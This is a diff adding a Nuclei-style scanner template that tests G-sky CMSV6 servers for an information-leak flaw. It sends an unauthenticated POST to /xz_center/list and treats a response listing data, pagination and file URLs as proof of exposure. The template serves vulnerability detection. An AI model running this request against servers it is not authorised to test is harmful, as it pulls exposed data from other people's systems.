@@ -1,0 +1,29 @@
+id: G-sky-CMSV6-list-infovul
+
+info:
+  name: "G-sky-CMSV6 list 接口信息泄露漏洞"
+  author: pitaya
+  severity: high
+  
+
+  tags: G-sky-CMS
+http:
+  - raw:
+      - |
+        POST /xz_center/list HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        page=1
+    
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains_all(body_1, "data", "pagination", "fileUrl")'  
+        condition: and
